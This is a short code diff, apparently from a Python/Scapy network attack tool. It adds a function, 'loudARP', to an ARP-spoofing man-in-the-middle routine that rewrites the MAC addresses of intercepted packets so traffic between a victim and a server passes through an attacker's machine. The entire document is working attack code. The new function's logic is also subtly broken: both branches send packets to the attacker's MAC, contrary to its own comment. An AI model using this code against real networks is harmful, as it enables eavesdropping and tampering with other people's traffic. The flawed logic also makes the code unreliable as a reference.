@@ -24,3 +24,21 @@ def interceptARP(pkt, interceptedPkt, attackerMAC, spoofIP, serverMAC, victimMAC
 
         # send packet to the network
         sendp(pkt, iface=networkInterface)
+
+
+def loudARP(pkt, interceptedPkt, attackerMAC, spoofIP, serverMAC, victimMAC, networkInterface):
+    # update intercepted packet list
+    if pkt[Ether].dst == attackerMAC:
+        if pkt[IP].dst in spoofIP:
+            pkt[Ether].dst = attackerMAC
+        else:
+            # case 2: server response for the request of the victim
+            # so replace destination MAC to the MAC of victim
+            pkt[Ether].dst = attackerMAC
+
+        # put src to attackerMAC as both arp tables of server and victim
+        # maintain requested IP andresses under attacker MAC
+        pkt[Ether].src = attackerMAC
+
+        # send packet to the network
+        sendp(pkt, iface=networkInterface)
